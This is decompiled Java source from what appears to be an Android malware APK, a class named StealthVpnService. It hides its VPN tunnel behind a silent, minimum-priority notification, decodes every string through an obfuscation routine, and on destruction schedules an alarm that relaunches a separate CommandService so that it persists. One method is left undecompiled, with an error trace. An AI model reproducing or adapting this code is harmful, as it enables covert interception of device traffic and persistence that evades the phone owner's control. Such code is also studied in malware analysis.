package com.base.template.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import androidx.core.app.NotificationCompat$Builder;
import kotlin.io.CloseableKt;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class StealthVpnService extends VpnService {
    public static volatile StealthVpnService instance;
    public static volatile boolean isRunning;
    public ParcelFileDescriptor tunFd;

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        instance = this;
        isRunning = true;
    }

    /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
        jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:7:0x003d
        	at jadx.core.dex.visitors.blocks.BlockSplitter.addTempConnectionsForExcHandlers(BlockSplitter.java:280)
        	at jadx.core.dex.visitors.blocks.BlockSplitter.visit(BlockSplitter.java:79)
        */
    @Override // android.app.Service
    public final void onDestroy() {
        /*
            r9 = this;
            android.os.ParcelFileDescriptor r0 = r9.tunFd     // Catch: java.lang.Exception -> L7
            if (r0 == 0) goto L7
            r0.close()     // Catch: java.lang.Exception -> L7
        L7:
            r0 = 0
            r9.tunFd = r0
            com.base.template.services.StealthVpnService.instance = r0
            r0 = 0
            com.base.template.services.StealthVpnService.isRunning = r0
            r6 = 4
            byte[] r6 = new byte[r6]
            r6 = {x0084: FILL_ARRAY_DATA , data: [16, 71, 73, 11} // fill-array
            java.lang.String r1 = "c19e8f058a"
            java.lang.String r1 = p000.C0000.decode(r6, r1)
            android.content.SharedPreferences r1 = r9.getSharedPreferences(r1, r0)
            r6 = 7
            byte[] r6 = new byte[r6]
            r6 = {x008a: FILL_ARRAY_DATA , data: [68, 79, 71, 88, 57, 94, 92} // fill-array
            java.lang.String r2 = "7976f12c834115"
            r8 = 1
            java.lang.String r2 = p000.C0000.decode(r6, r2, r8)
            boolean r0 = r1.getBoolean(r2, r0)
            if (r0 == 0) goto L80
        L3e:
            r6 = 5
            byte[] r6 = new byte[r6]     // Catch: java.lang.Exception -> L80
            r6 = {x0092: FILL_ARRAY_DATA , data: [3, 15, 88, 75, 8} // fill-array     // Catch: java.lang.Exception -> L80
            java.lang.String r0 = "bc99ef46"
            java.lang.String r0 = p000.C0000.decode(r6, r0)     // Catch: java.lang.Exception -> L80
            java.lang.Object r0 = r9.getSystemService(r0)     // Catch: java.lang.Exception -> L80
            android.app.AlarmManager r0 = (android.app.AlarmManager) r0     // Catch: java.lang.Exception -> L80
            android.content.Intent r1 = new android.content.Intent     // Catch: java.lang.Exception -> L80
            java.lang.Class<com.base.template.services.CommandService> r2 = com.base.template.services.CommandService.class
            r1.<init>(r9, r2)     // Catch: java.lang.Exception -> L80
            r6 = 11
            byte[] r6 = new byte[r6]     // Catch: java.lang.Exception -> L80
            r6 = {x009a: FILL_ARRAY_DATA , data: [99, 105, 124, 109, 49, 115, 50, 103, 116, 107, 102} // fill-array     // Catch: java.lang.Exception -> L80
            java.lang.String r2 = "5922c6a3"
            r8 = 0
            java.lang.String r2 = p000.C0000.decode(r6, r2, r8)     // Catch: java.lang.Exception -> L80
            r1.setAction(r2)     // Catch: java.lang.Exception -> L80
            r2 = 6699(0x1a2b, float:9.387E-42)
            r3 = 201326592(0xc000000, float:9.8607613E-32)
            android.app.PendingIntent r1 = android.app.PendingIntent.getService(r9, r2, r1, r3)     // Catch: java.lang.Exception -> L80
            long r2 = android.os.SystemClock.elapsedRealtime()     // Catch: java.lang.Exception -> L80
            r4 = 3000(0xbb8, double:1.482E-320)
            long r2 = r2 + r4
            r4 = 2
            r0.setExactAndAllowWhileIdle(r4, r2, r1)     // Catch: java.lang.Exception -> L80
        L80:
            super.onDestroy()
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.base.template.services.StealthVpnService.onDestroy():void");
    }

    @Override // android.net.VpnService
    public final void onRevoke() {
        try {
            ParcelFileDescriptor parcelFileDescriptor = this.tunFd;
            if (parcelFileDescriptor != null) {
                parcelFileDescriptor.close();
            }
        } catch (Exception unused) {
        }
        this.tunFd = null;
        stopSelf();
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        String strDecode = C0000.decode(new byte[]{65, 18, 68, 12, 102, 84, 88}, "2d4b970c766a", 0.0f);
        try {
            int i3 = Build.VERSION.SDK_INT;
            NotificationChannel notificationChannel = new NotificationChannel(strDecode, C0000.decode(new byte[]{32, 14, 95, 93, 6, 7, 23, 11, 12, 15, 17, 96, 6, 22, 21, 11, 0, 4}, "ca13cdcb", true), 1);
            notificationChannel.setShowBadge(false);
            notificationChannel.setSound(null, null);
            ((NotificationManager) getSystemService(C0000.decode(new byte[]{11, 95, 65, 12, 4, 8, 1, 3, 70, 15, 10, 89}, "e05ebabb2fe79fcd", 0.0f))).createNotificationChannel(notificationChannel);
            NotificationCompat$Builder notificationCompat$Builder = new NotificationCompat$Builder(this, strDecode);
            notificationCompat$Builder.mNotification.icon = 2131034139;
            notificationCompat$Builder.mPriority = -2;
            notificationCompat$Builder.setFlag(2, true);
            notificationCompat$Builder.mSilent = true;
            Notification notificationBuild = notificationCompat$Builder.build();
            if (i3 >= 34) {
                startForeground(9950, notificationBuild, 1073741824);
            } else {
                startForeground(9950, notificationBuild);
            }
            if (this.tunFd == null) {
                try {
                    ParcelFileDescriptor parcelFileDescriptorEstablish = new VpnService.Builder(this).setSession(C0000.decode(new byte[]{103, 84, 86, 70, 69, 85, 18, 32, 12, 87, 94, 82, 6, 22, 93, 94, 91}, "4153702cc907eb", 5)).addAddress(C0000.decode(new byte[]{8, 0, 30, 2, 80, 1, 26, 0, 84, 12, 22, 7}, "9000e442a98664", 4), 32).addRoute(C0000.decode(new byte[]{5, 8, 31, 7, 13, 12, 26, 4, 5, 0, 26, 9}, "481589460549af11"), 30).setMtu(1400).setBlocking(false).establish();
                    this.tunFd = parcelFileDescriptorEstablish;
                    if (parcelFileDescriptorEstablish != null) {
                        CloseableKt.markEnabled(this);
                    } else {
                        stopSelf();
                    }
                } catch (Exception e) {
                    e.getMessage();
                    stopSelf();
                }
            }
            return 1;
        } catch (Exception e2) {
            e2.getMessage();
            stopSelf();
            return 2;
        }
    }
}
